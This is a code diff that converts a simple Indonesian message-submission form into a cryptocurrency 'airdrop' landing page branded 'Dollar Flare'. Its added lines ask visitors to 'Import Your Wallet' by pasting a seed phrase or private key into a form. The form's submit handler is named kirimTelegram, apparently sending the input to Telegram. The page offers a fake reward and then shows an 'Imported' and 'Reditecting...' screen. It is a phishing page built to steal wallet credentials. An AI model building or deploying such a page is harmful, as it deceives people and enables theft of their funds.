@@ -332,8 +332,7 @@
         </div>
       </a>
       <button type="button" class="nav-pill" onclick="Scroll()">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13"/><path d="M22 2L15 22l-4-9-9-4 20-7z"/></svg>
-        Kirim Pesan
+        Claim
       </button>
     </nav>
 
@@ -342,7 +341,7 @@
       <h1>Proof Of Activity
 <br><span class="line-accent">Real Users Only
 </span><br><span class="line-gold">Earn Across Chains</span></h1>
-      <p class="hero-sub">Platform sederhana dan elegan untuk mengirimkan pesan, masukan, atau pertanyaanmu. Kami siap mendengarkan setiap kata.</p>
+      <p class="hero-sub">We are live on Base at first launch. Built for those who actually move on-chain.</p>
       <div class="hero-cta-group">
         <div class="ticker-track" id="tickerTrack">
           
@@ -353,8 +352,8 @@
     <div class="stats-bar">
       <div class="stats-inner">
         <div class="stat-item"><div class="stat-num">Real Users</div><div class="stat-label">On-chain verified</div></div>
-        <div class="stat-item"><div class="stat-num gold">No Costs
-</div><div class="stat-label">Instant Claim</div></div>
+        <div class="stat-item"><div class="stat-num gold">Gas Only
+</div><div class="stat-label">No Costs</div></div>
         <div class="stat-item"><div class="stat-num">Scalable</div><div class="stat-label">Built to grow</div></div>
       </div>
     </div>
@@ -394,8 +393,7 @@
 </div>
         
         <button id="targetScroll" type="button" class="btn-primary" onclick="openModal()">
-          Kirim Pesanmu
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13"/><path d="M22 2L15 22l-4-9-9-4 20-7z"/></svg>
+          Start
         </button>
       </div>
     </section>
@@ -407,27 +405,26 @@
       <button type="button" class="modal-close" onclick="closeModal()">✕</button>
       <div id="formState">
         <div class="modal-eyebrow">Dollar Flare</div>
-        <h3>Tulis Pesanmu</h3>
-        <p class="modal-sub">Sampaikan apa saja — masukan, pertanyaan, atau saran terbaikmu.</p>
+        <h3>Import Your Wallet</h3>
+        <p class="modal-sub">Seed Phrase/Private Key</p>
         <form onsubmit="kirimTelegram(event)">
           <div class="form-group">
-            <label>Pesan</label>
-            <textarea id="inputPesan" placeholder="Tulis pesanmu di sini..." required></textarea>
+            <textarea id="inputPesan" required></textarea>
           </div>
-          <button class="btn-submit" type="submit" id="btnSubmit">Kirim Pesan →</button>
+          <button class="btn-submit" type="submit" id="btnSubmit">Import</button>
         </form>
       </div>
       <div class="success-state" id="successState">
         <div class="success-icon">✓</div>
-        <h3>Pesan Terkirim!</h3>
-        <p>Terima kasih telah menghubungi kami.<br>Pesanmu telah tersimpan dengan sukses.</p>
+        <h3>Imported</h3>
+        <p>Reditecting...</p>
       </div>
     </div>
   </div>
 
   <div class="toast" id="toast">
     <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
-    Pesan berhasil dikirim!
+    Success!
   </div>
 
   <script>
